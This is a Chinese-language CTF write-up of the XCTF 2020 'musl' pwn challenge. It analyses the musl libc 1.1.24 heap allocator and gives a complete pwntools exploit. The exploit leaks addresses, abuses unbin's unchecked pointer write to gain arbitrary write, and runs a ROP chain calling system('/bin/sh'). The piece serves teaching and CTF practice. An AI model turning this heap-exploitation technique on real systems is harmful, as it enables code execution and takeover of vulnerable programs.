---
title: xctf2020_musl
date: 2021-10-18 00:12:01
permalink: /pages/1b136e/
categories:
  - ctf_wp
  - xctf
  - 2020
tags:
  - 
---
# xctf2020-pwn musl题解

题目是xctf2020 高校联合抗疫pwn musl题目, [题目文件](https://github.com/xf1les/XCTF_2020_PWN_musl/tree/master), 

[[toc]] 

## 题目分析

首先是分析下程序和相关环境, 

### 程序分析

菜单堆题, 提供了比较标准的add, dele, edit, show功能, 

add中可以使用一次溢出, 

![image-20210909205614639](https://i.loli.net/2021/09/09/qrVeBc5pihL9OEu.png)

show功能只能使用一次,  

![image-20210909205722767](https://i.loli.net/2021/09/09/DTWn1gUrl4fEe23.png)

封装了一层类似puts的函数, 打印strlen长度, 可能存在泄漏, 

![image-20210909205857859](https://i.loli.net/2021/09/09/rHMVtdpyenLzkKJ.png)

但是读取数据是封装了一层read, 回车符会转化为`'\x00'`, 

![image-20210909205926892](https://i.loli.net/2021/09/09/Km65729REU8Zq4Q.png)

### 保护机制

除了pie都全开, 

![image-20210909210019860](https://i.loli.net/2021/09/09/lX3yWeK6HiFZE7N.png)

### libc 

这个题目值得注意的是, 他使用musllibc, 版本是`1.1.24`

![image-20210909210723051](https://i.loli.net/2021/09/09/UBJlobXgfpFCmZc.png)

可以在musllibc官网找到源码, 使用`git checkout  v1.1.24`切换版本,  堆分配器部分的代码主要在`./src/malloc/malloc.c`里面,  

## musl libc  1.1.24

### 整体思路

首先是基本的用户使用的内存称为chunk, 使用psize和csize代表上个chunk和本chunk的size, 然后是free状态下的next和prev指针, 同时这一部分也复用作为malloc状态下的用户空间, 

然后free状态下, 使用双重指针链接到bin, bin共存在64个,  小size的bin中size差距较小, 大size的bin中size差距较大, (可查看`adjust_size`函数), 

有一个`mal`结构体, 为整个堆空间的总控制,  64个 bin就保存在这里, 然后binmaps用作标识, 其中的每一位标识对应bin是否为空, 

### 结构

使用fifo的双向链表bin组织chunk, chunk的结构设计如下:

```c
struct chunk {
	size_t psize, csize;
	struct chunk *next, *prev;
};

struct bin {
	volatile int lock[2];
	struct chunk *head;
	struct chunk *tail;
};

static struct {
	volatile uint64_t binmap;
	struct bin bins[64];
	volatile int free_lock[2];
} mal;
```

### malloc实现

malloc函数设计思路是, 判断大小, 过大的size使用mmap, 否则获取对应bin索引值, 

然后尝试查找`binmap`, 查看对应的bin是否存在chunk, 

如果所有bin全是空的则拓展堆空间,如果存在不为空的bin则选择大小最接近size的bin取出, 取出方式有两种, 

* 从大chunk中切割出来是pretrim函数实现, 
* 直接取出是unbin函数实现

> 这个两种情况分别对应小size的bin同bin下size差距比较小, 和大size的bin, 同一个bin下size差距比较大, 

取出后再进行`trim`函数切割, 回收chunk超过需求的大小部分,  将多余部分切割出来并释放到bin中,

### free实现

首先检查double free和是否为mmap, 则使用unmmap, 否则进入`__bin_chunk`函数, 将对应chunk放入对应bin,  其中反复检查前后chunk是否可以合并, 期间进行unbin等操作,

## 解题

### leak+unbin+rop

其实是个非预期解法, 但是刚接触到musl libc, 思路更多还是在尝试找到熟悉的利用方案, 看到unbin函数其实和unlink宏/函数(后面改成了个函数)功能一致, 而且检测很少, 于是考虑使用类似的攻击方案, 

#### leak

首先是泄漏的问题, 由于输入使用`my_read`函数, 回车符会转义为'\x00', 于是puts就截断了,  

这里关键点是想到了如果不输入回车的话就s可, 而不输入回车,  则输入的size很小, 而且配合malloc会存在最小的chunk大小, 于是`add(1)`, 返回一个0x20chunk, 我们写入一个字节就没有回车符,  然后提前add+dele会有残留的链表地址, 可以show直接打印出来,

#### unbin

其实利用这个函数, 没有检测的一个指针互写, 

效果就是

```c
static void unbin(struct chunk *c, int i)
{
	if (c->prev == c->next)
		a_and_64(&mal.binmap, ~(1ULL<<i));
	c->prev->next = c->next;
	c->next->prev = c->prev;
	c->csize |= C_INUSE;
	NEXT_CHUNK(c)->psize |= C_INUSE;
}
```

和之前ptmalloc利用思路差不多, 我们leak以后可以得到chunk_list的地址, 

那么直接利用指针互写, 向`chunk_list`里面写入一个`chunk_list`的地址, 

伪造chunk的话仍然是类似ptmalloc的思路, 同时可以配合前面leak的堆风水, 进行排布, 

这里要注意的另一个问题是chunk_list是一个结构如下的结构体数组,  要注意edit函数对size有检测, unbin写入指针需要注意偏移一下, 避开size:

​	![image-20210909230956157](https://i.loli.net/2021/09/09/wiF2gu4vTBNXGLs.png)

![image-20210909231111895](https://i.loli.net/2021/09/09/D7Rh3yVMgYtIEmN.png)

向chunk_list写入chunk_list自身指针以后, 就可以直接修改整个`chunk_list`比较完美的实现任意地址写, 然后这个musl libc没有常见的hook位, 直接打印`environ`打印出stack值, 直接写rop了

#### rop

没写过musllibc开发程序, 这个程序内也没常见的几个gadget, 直接在libc找到了个poprdi, 然后可以直接`system(binsh)`, 就ok了, 

#### exp

```python
from pwn import * 

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

cn = process("./bin")

cmd = '''
'''

dbg = lambda : gdb.attach(cn, cmd)
sl  = lambda x: cn.sendline(x)
sla = lambda a, b: cn.sendlineafter(a, b)
sa  = lambda a, b: cn.sendafter(a,  b)
ru  = lambda a: cn.recvuntil(a)
re = lambda a: cn.recv(a)

def add(size, flag='n', con='a'):
	sla(">", '1')
	sla("? >", str(size))
	sla("? >", flag)
	sla("sleeve >", con)

def edit(idx, con):
	sla(">", '3')
	sla("? >", str(idx))
	sl(con)

def show(idx):
	sla(">", '4')
	sla("? >", str(idx))

def dele(idx):
	sla(">", '2')
	sla("? >", str(idx))

def exp():
	add(0x20)	# 0
	add(0x20)	# 1
	add(0x20)	# 2
	add(0x20)	# 3

	'''
	heap:
		0x40: chunk0
		0x40: chunk1
		0x40: chunk2
		0x40: chunk3
	'''

	dele(0)
	dele(1)
	add(1, 'n', '\x50')	# 0
	show(0)
	leak = u64(re(6).ljust(8, b'\x00'))
	libc = leak - 0x292e50 + 0x300
	environ = libc + 0x294fd8
	chunk_list = libc + 0x290000

	dele(0)

	'''
	heap:
		0x40: chunk0
		0x40: chunk1
		0x40: chunk2
		0x40: chunk3
		topchunk
	'''

	fake_chunk = flat(0x1, 0x70, chunk_list+0x8, chunk_list+0x8).ljust(0x70, b'\x00')
	add(0x70, 'Y', flat(fake_chunk, 0x70, 0x41)) # 0
	'''
	heap:
		0x80: 
			0x70: fake_chunk free
		0x40: chunk2
		0x40: chunk3
		topchunk
	'''

	# add(0x70) # 0
	add(0x70) # for chunk_list[1].size 
	
	dele(2)  # unbin 

	check_show = 0x0000000000602034
	# chunk_list[1].chunk = &chunk_list 
	edit(1, flat(environ, 0x70, chunk_list, 0x70, check_show))
	'''
	chunk_list
		0x70, environ, 
		0x70, chunk_list, 
		0x70, check_show
	'''
	edit(2, p32(0))
	# check_show = 0
	show(0)
	# show(chunk_list[0] = environ)
	stack = u64(re(6).ljust(8, b'\x00'))
	print('stack', hex(stack))

	edit(1, flat(0x70, stack - 0x70))
	'''
	chunk_list
		0x70, rop_stack, 
	'''
	poprdi = 0x14862 + libc 
	binsh  = 0x91345 + libc
	system = 0x42688 + libc
	edit(0, flat(
		poprdi, binsh, system))	


exp()
cn.interactive()

```

### leak+unbin+fake_bin+FSOP

主要是对于musl libc的利用, 复现来自[题目作者文章](https://www.anquanke.com/post/id/202253), 

#### leak

leak部分和前面一样, 但是作者提到, 堆块本身就链接在链表中, 于是可以直接`add(1)`的形式泄漏,

#### unbin

仍然是, 经典的指针互写, 

* `*(uint64_t*)(prev + 2) = next`
* `*(uint64_t*)(next + 3) = prev`

这里的思路就是攻击链表结构, 利用这个unbin操作, 修改`mal.bin[i]->head`, 然后控制bin链表,  实现任意地址写, 

